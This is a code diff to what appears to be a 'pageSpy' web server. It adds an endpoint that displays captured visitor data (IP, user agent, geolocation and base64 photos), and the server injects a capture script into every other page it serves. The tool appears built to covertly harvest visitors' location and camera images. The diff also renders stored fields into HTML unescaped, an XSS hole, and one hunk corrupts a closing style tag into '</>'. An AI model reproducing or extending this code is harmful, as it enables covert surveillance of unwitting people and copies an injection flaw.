@@ -94,6 +94,140 @@ app.post(
   },
 );
 
+app.get(
+  "/api/show-page-view/:pageSpyId",
+  zValidator(
+    "param",
+    z.object({
+      pageSpyId: z.string(),
+    }),
+  ),
+  async (c) => {
+    const { pageSpyId } = c.req.valid("param");
+
+    const pageViewData = await prismaClient.pageSpyView.findMany({
+      where: {
+        pageSpyId,
+      },
+      select: {
+        id: true,
+        ip: true,
+        userAgent: true,
+        location: true,
+        photoBase64: true,
+      },
+      orderBy: {
+        id: "desc",
+      },
+    });
+
+    const htmlTableRows = pageViewData
+      .map((view) => {
+        const photoLink = view.photoBase64
+          ? `<a href="#" onclick="openBase64Image('${view.photoBase64.replace(/'/g, "\\'")}')" target="_blank">View Photo</a>`
+          : "No Photo";
+        const locationLink = view.location
+          ? `<a href="https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(view.location)}" target="_blank">${view.location}</a>`
+          : "No Location";
+
+        return `
+        <tr>
+          <td>${view.id}</td>
+          <td>${view.ip}</td>
+          <td>${view.userAgent}</td>
+          <td>${locationLink}</td>
+          <td>${photoLink}</td>
+        </tr>
+      `;
+      })
+      .join("");
+
+    return c.html(`
+<style>
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0;
+}
+
+thead {
+  background-color: #f2f2f2;
+}
+
+th, td {
+  padding: 0.75rem 1rem;
+  text-align: left;
+  border: 1px solid #ccc;
+}
+
+th {
+  font-weight: bold;
+}
+
+@media (max-width: 600px) {
+  table, thead, tbody, th, td, tr {
+    display: block;
+    width: 100%;
+  }
+
+  thead tr {
+    display: none; /* Oculta cabeçalhos em telas muito pequenas */
+  }
+
+  tr {
+    margin-bottom: 1rem;
+    border: 1px solid #ccc;
+    padding: 0.5rem;
+  }
+
+  td {
+    border: none;
+    position: relative;
+    padding-left: 45%;
+    margin-bottom: 0.5rem;
+  }
+
+  td:before {
+    content: attr(data-label); /* Mostra o nome da coluna */
+    position: absolute;
+    left: 1rem;
+    font-weight: bold;
+  }
+}
+</style>
+
+<table>
+  <thead>
+    <tr>
+      <th>ID</th>
+      <th>IP Address</th>
+      <th>User Agent</th>
+      <th>Location</th>
+      <th>Photo</th>
+    </tr>
+  </thead>
+  <tbody>
+    ${htmlTableRows}
+  </tbody>
+</table>
+
+<script>
+  function openBase64Image(base64Data) {
+    const newWindow = window.open();
+    if (!newWindow) {
+      alert('Não foi possível abrir a nova aba. Verifique bloqueadores de pop-up.');
+      return;
+    }
+    newWindow.document.write('<html><head><title>Foto</title></head><body style="margin:0;">');
+    newWindow.document.write('<img src="' + base64Data + '" style="max-width:100%; height:auto;" />');
+    newWindow.document.write('</body></html>');
+  }
+</script>
+
+`);
+  },
+);
+
 app.get("/*", async (c) => {
   const scriptCaptureDataString = fs.readFileSync("scripts/captureData.js", {
     encoding: "utf-8",
@@ -177,7 +311,7 @@ app.get("/*", async (c) => {
     color: white;
     border: none;
   }
-</style>
+</>
 </head>
 <body>
   ${showContent}
